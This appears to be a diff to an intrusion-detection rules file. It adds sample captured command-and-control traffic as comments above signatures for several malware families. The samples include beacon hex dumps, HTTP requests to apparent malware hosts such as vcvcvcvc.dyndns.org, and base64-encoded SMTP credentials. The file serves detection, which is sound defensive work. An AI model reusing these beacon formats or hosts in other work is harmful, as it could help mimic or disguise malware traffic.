@@ -508,6 +508,23 @@ alert http any any -> any 443 (\
 #Taleret.E end
 
 #LURK begin
+#
+# Client beacon
+# 0000   4c 55 52 4b 30 97 00 00 00 94 05 00 00 78 9c 6b   LURK0........x.k
+# 0010   66 f0 65 f0 61 70 67 70 62 70 61 30 63 18 05 23   f.e.apgpbpa0c..#
+# 0020   19 ac 11 f8 db e2 c2 e0 0a 4c 0f 3e 0c 11 0c 21   .........L.>...!
+# 0030   60 31 2e 06 66 86 72 46 0e 86 a2 d4 bc 94 fc 24   `1..f.rF.......$
+# 0040   ea d8 23 c3 c8 c0 c0 0a a4 81 14 83 06 17 03 03   ..#.............
+# 0050   13 90 0e 66 48 65 28 62 28 63 c8 64 48 06 b2 14   ...fHe(b(c.dH...
+# 0060   18 02 18 12 81 ac 6c 20 cb 98 3a 96 0e 72 c0 0c   ......l ..:..r..
+# 0070   22 18 19 81 21 9f c8 50 0a 0c 89 c4 81 76 d0 00   "...!..P.....v..
+# 0080   81 56 60 7a 30 64 30 60 30 02 c6 bb 2f b0 54 1a   .V`z0d0`0.../.T.
+# 0090   89 00 00 84 67 12 29                              ....g.)
+# 
+# Server Response
+# 0000   4c 55 52 4b 30 16 00 00 00 01 00 00 00 78 9c 63   LURK0........x.c
+# 0010   00 00 00 01 00 01                                 ......
+
 alert tcp any any -> any any (\
 	msg:"LURK simple rule";\
 	content:"LURK"; offset:0; depth:4;\
@@ -539,6 +556,31 @@ alert tcp any any -> any any (\
 #LURK end
 
 #DNSWatch begin
+#
+#    POST http://vcvcvcvc.dyndns.org:8080/index.pl ?id=21410 HTTP/1.1\r\n
+#    User-Agent: Mozilla/4.8.20 (compatible; MSIE 5.0.2; Win32)\r\n
+#    Content-Type: multipart/form-data; boundary=----------2B9250BB47EE537B\r\n
+#    Host: vcvcvcvc.dyndns.org \r\n
+#    Content-Length: 208\r\n
+#    Proxy-Connection: keep-alive\r\n
+#    Pragma: no-cache\r\n
+#    \r\n
+#
+# Payload
+# 0000   2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 32 42 39 32 35 30   ----------2B9250
+# 0010   42 42 34 37 45 45 35 33 37 42 0d 0a 43 6f 6e 74   BB47EE537B..Cont
+# 0020   65 6e 74 2d 44 69 73 70 6f 73 69 74 69 6f 6e 3a   ent-Disposition:
+# 0030   20 66 6f 72 6d 2d 64 61 74 61 3b 20 6e 61 6d 65    form-data; name
+# 0040   3d 22 55 70 6c 6f 61 64 46 69 6c 65 22 3b 20 66   ="UploadFile"; f
+# 0050   69 6c 65 6e 61 6d 65 3d 22 31 36 31 44 33 46 43   ilename="161D3FC
+# 0060   33 2e 70 6e 67 22 0d 0a 43 6f 6e 74 65 6e 74 2d   3.png"..Content-
+# 0070   54 79 70 65 3a 20 61 70 70 6c 69 63 61 74 69 6f   Type: applicatio
+# 0080   6e 2f 6f 63 74 65 74 2d 73 74 72 65 61 6d 0d 0a   n/octet-stream..
+# 0090   0d 0a 01 6e 65 77 5f 68 6f 73 74 5f 34 39 00 00   ...new_host_49..
+# 00a0   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
+# 00b0   00 00 0d 0a 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 32 42   ....----------2B
+# 00c0   39 32 35 30 42 42 34 37 45 45 35 33 37 42 2d 2d   9250BB47EE537B--
+
 alert tcp any any -> any any (\
 	msg:"DNSWatch simple rule";\
 	content:"POST http://"; offset:0; depth:12;\
@@ -554,6 +596,15 @@ alert tcp any any -> any any (\
 #DNSWatch end
 
 #Lagulon begin
+#
+#    POST /i/server.php HTTP/1.1\r\n
+#    Content-Disposition: inline; comp=TEQUILABOOMBOOM; account=janettedoe; product=3;\r\n
+#    User-Agent: Mozilla/5.0\r\n
+#    Host: www.asiess.com\r\n
+#    Content-Length: 0\r\n
+#    Cache-Control: no-cache\r\n
+#    \r\n
+
 alert tcp any any -> any any (\
 	msg:"Lagulon simple rule";\
 	content:"POST /"; offset:0; depth:6;\
@@ -583,6 +634,13 @@ alert http any any -> any any (\
 #Lagulon end
 
 #Likseput begin
+#
+#    GET /index.html HTTP/1.1\r\n
+#    User-Agent: 5.1 10:59 DELLXT\Laura\r\n
+#    Host: nasa.usnewssite.com\r\n
+#    Cache-Control: no-cache\r\n
+#    \r\n
+
 alert tcp any any -> any any (\
 	msg:"Likseput simple rule";\
 	content:"User-Agent: 5.1 ";\
@@ -603,6 +661,13 @@ alert http any any -> any any (\
 #Likseput end
 
 #Sanny-Daws begin
+#
+#Username
+# 0000   62 57 46 70 62 47 4a 76 62 33 52 6c               bWFpbGJvb3Rl
+#
+#Password
+# 0000   4d 6a 49 7a 4f 44 45 79 0d 0a                     MjIzODEy..
+
 alert tcp any any -> any 25 (\
 	msg:"Sanny-Daws simple rule - SMTP password";\
 	content:"MjIzODEy|0d 0a|"; offset:0; depth:10;\
@@ -638,6 +703,18 @@ alert smtp any any -> any any (\
 #Sanny-Daws end
 
 #Mediana begin
+#
+#    GET http://firewall.happytohell.com:80/index.htm?n763t4OPm*rs6fXq7fXp7uj16e-r&testid HTTP/1.0\r\n
+#    Accept: */*\r\n
+#    Accept-Language: en-us \r\n
+#    Pragma: no-cache \r\n
+#    User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n
+#    Host: firewall.happytohell.com:80 \r\n
+#    X-HOST: n763t4OPm*rs6fXq7fXp7uj16e-r \r\n
+#    Content-Length: 0 \r\n
+#    Proxy-Connection: Keep-Alive \r\n
+#    \r\n
+
 alert tcp any any -> any any (\
 	msg:"Mediana simple rule";\
 	content:"GET http://"; offset:0; depth:11;\
